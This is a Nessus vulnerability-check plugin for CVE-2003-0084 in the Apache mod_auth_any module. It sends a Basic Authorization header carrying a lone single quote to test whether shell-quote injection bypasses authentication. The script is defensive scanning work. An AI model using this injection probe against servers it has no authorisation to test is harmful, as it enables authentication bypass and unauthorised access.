#
# (C) Tenable Network Security, Inc.
#

# Ref:
#
# From: Mario Sergio Fujikawa Ferreira <lioux@FreeBSD.org>
# Date: Mon, 24 Mar 2003 20:23:11 -0800 (PST)
# To: ports-committers@FreeBSD.org, cvs-ports@FreeBSD.org,
#         cvs-all@FreeBSD.org
# Subject: cvs commit: ports/www/mod_auth_any Makefile ports/www/mod_auth_any/files
#         bash_single_quote_escape_string.c patch-mod_auth_any.c


include("compat.inc");

if(description)
{
 script_id(11481);
 script_version("$Revision: 1.27 $");
 script_cve_id("CVE-2003-0084");
 script_bugtraq_id(7448);
 script_osvdb_id(13640);
 script_xref(name:"RHSA", value:"2003:113-01");

 script_name(english:"mod_auth_any for Apache Metacharacter Remote Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code may be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The remote host seems to be running mod_auth_any, an Apache Module
which allows the use of third-party authentication programs.

This module does not properly escape shell characters when a
username is supplied, and therefore an attacker may use this module
to :
 - Execute arbitrary commands on the remote host
 - Bypass the authentication process completely" );
 script_set_attribute(attribute:"solution", value:
"Patch mod_auth_any or disable it." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"see_also", value:"http://www.freebsd.org/cgi/cvsweb.cgi/ports/www/mod_auth_any/files/" );

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/02/10");
 script_cvs_date("$Date: 2016/11/28 21:52:56 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Attempts to log into the remote web server");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("no404.nasl", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if ( report_paranoia < 2 )
{
 banner = get_http_banner(port:port);
 if ("Apache" >!< banner ) exit(0, "The web server on port "+port+ "is not Apache.");
}

pages = get_kb_list(string("www/", port, "/content/auth_required"));
if (isnull(pages)) exit(0, "No protected pages were found on port "+port+".");
pages = make_list(pages);

foreach file (pages)
{
 r = http_send_recv3(port:port, method: "GET", item: file, username: "", password: "", exit_on_fail: 1);
 before = strcat(r[0], r[1], '\r\n', r[2]);
 debug_print('1st req on port ', port, '\n', before, '\n');
 
 if (ereg(pattern:"^HTTP/[0-9]\.[0-9] 40[13] .*", string: r[0]))
 {
  # Jzo= -> ':
  r = http_send_recv3(port:port, method: "GET", item: file, username: "", password: "", add_headers: make_array('Authorization', 'Basic Jzo='), exit_on_fail: 1);
  if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 ", string: r[0]))
  {
   # YTpi -> a:b
   r2 = http_send_recv3(port:port, method: "GET", item: file, username: "", password: "", add_headers: make_array('Authorization', 'Basic YTpi'), exit_on_fail: 1);
   if ( r2[0] == r[0] ) # We got a 200 error code in both cases, make sure it's not a FP
   {
    if (report_paranoia < 2)
     exit(1, "This flaw cannot be tested reliably as we got a 200 reply to "+
build_url(port: port, qs: file, username:'a', password:'b'));

    if ( strlen(r2[2]) == 0 && strlen(r[2]) == 0 ) exit(0);
    if ( r2[2] == r[2] ) exit(0);
   }

    res = strcat(r[0], r[1], '\r\n', r[2]);
    debug_print('2nd req on port ', port, '\n', res, '\n');
   security_hole(port:port, extra:
'A plain request for \'' + file + '\' gives the following output :\n' 
+ beginning_of_response(resp: before, max_lines: 50)
+ '\n\nwhile a specially crafted request produces :\n' 
+ beginning_of_response(resp: res, max_lines: 50) );
   exit(0);
  }
 }
}
